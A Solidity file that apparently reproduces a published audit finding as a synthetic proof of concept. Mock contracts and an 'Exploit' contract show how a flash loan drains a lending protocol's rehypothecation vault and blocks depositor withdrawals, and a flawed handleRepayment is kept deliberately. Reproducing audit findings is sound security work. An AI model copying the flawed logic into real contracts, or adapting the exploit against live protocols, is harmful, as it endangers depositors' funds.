// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cod3x Lend — flash loan empties the rehypothecation vault (Spearbit, finding 49181).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    transferUnderlyingTo calls _rebalance, which pulls 1000 out of the vault,
    then sends that 1000 to the borrower. handleRepayment only adds the
    repaid 1000 to _underlyingAmount. The tokens stay on the aToken. The
    vault balance is 0, so the depositor's withdraw reverts. The control
    aToken reverts in transferUnderlyingTo, the vault keeps 1000, and the
    depositor withdraws 1000. The blamed functions are preserved verbatim
    (@> VULN). run() does not warp. */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

library SafeTransfer {
    function safeTransfer(IERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "transfer");
    }
}

contract MockToken is IERC20 {
    string public name = "Underlying";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount && balanceOf[from] >= amount, "from");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    IERC20 public asset;
    address public aToken;
    mapping(address => uint256) public deposits;

    constructor(address asset_) {
        asset = IERC20(asset_);
    }

    function setAToken(address aToken_) external {
        aToken = aToken_;
    }

    function deposit(uint256 amount) external {
        require(asset.transferFrom(msg.sender, address(this), amount), "deposit");
        deposits[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "credit");
        require(asset.balanceOf(address(this)) >= amount, "vault empty");
        deposits[msg.sender] -= amount;
        require(asset.transfer(msg.sender, amount), "withdraw");
    }

    function pull(address to, uint256 amount) external {
        require(msg.sender == aToken, "only aToken");
        require(asset.balanceOf(address(this)) >= amount, "vault empty");
        require(asset.transfer(to, amount), "pull");
    }
}

contract AToken {
    using SafeTransfer for IERC20;

    address public _underlyingAsset;
    Vault public vault;
    uint256 public _underlyingAmount;

    constructor(address asset_, address vault_) {
        _underlyingAsset = asset_;
        vault = Vault(vault_);
    }

    function noteLiquidity(uint256 amount) external {
        _underlyingAmount = amount;
    }

    function _rebalance(uint256 amount) internal {
        vault.pull(address(this), amount);
    }

    function transferUnderlyingTo(address target, uint256 amount) external returns (uint256) {
        _rebalance(amount);
        _underlyingAmount = _underlyingAmount - amount;
        IERC20(_underlyingAsset).safeTransfer(target, amount);
        return amount;
    }

    function handleRepayment(address user, address onBehalfOf, uint256 amount) external {
        user;
        onBehalfOf;
        // @> VULN: repayment does not return the tokens to the vault, so the depositor cannot withdraw
        _underlyingAmount = _underlyingAmount + amount;
    }
}

contract ControlAToken {
    function transferUnderlyingTo(address, uint256) external pure returns (uint256) {
        revert("flash blocked");
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;

    MockToken public token; // CREATE nonce 1
    Vault public vault; // CREATE nonce 2
    AToken public aToken; // CREATE nonce 3
    Vault public controlVault; // CREATE nonce 4
    ControlAToken public controlAToken; // CREATE nonce 5

    uint256 public vaultLeft;
    uint256 public stuckOnAToken;
    uint256 public accounted;
    uint256 public controlPaid;
    bool public withdrawBlocked;

    constructor() {
        token = new MockToken();
        vault = new Vault(address(token));
        aToken = new AToken(address(token), address(vault));
        vault.setAToken(address(aToken));
        controlVault = new Vault(address(token));
        controlAToken = new ControlAToken();
        token.mint(address(this), AMOUNT * 2);
    }

    function run() external {
        token.approve(address(vault), AMOUNT);
        vault.deposit(AMOUNT);
        aToken.noteLiquidity(AMOUNT);

        aToken.transferUnderlyingTo(address(this), AMOUNT);
        require(token.transfer(address(aToken), AMOUNT), "repay");
        aToken.handleRepayment(address(this), address(this), AMOUNT);

        vaultLeft = token.balanceOf(address(vault));
        stuckOnAToken = token.balanceOf(address(aToken));
        accounted = aToken._underlyingAmount();
        try vault.withdraw(AMOUNT) {
            withdrawBlocked = false;
        } catch {
            withdrawBlocked = true;
        }
        require(withdrawBlocked, "depositor withdrew from an empty vault");
        require(vaultLeft == 0, "vault still holds the deposit");
        require(stuckOnAToken == AMOUNT, "repaid tokens did not stay on the aToken");
        require(accounted == AMOUNT, "accounting did not record the repayment");

        token.approve(address(controlVault), AMOUNT);
        controlVault.deposit(AMOUNT);
        try controlAToken.transferUnderlyingTo(address(this), AMOUNT) {
            revert("flash was not blocked");
        } catch {}
        controlVault.withdraw(AMOUNT);
        controlPaid = AMOUNT;
        require(token.balanceOf(address(controlVault)) == 0, "control vault kept the deposit");
        require(controlPaid == AMOUNT, "control depositor was not paid");
    }
}
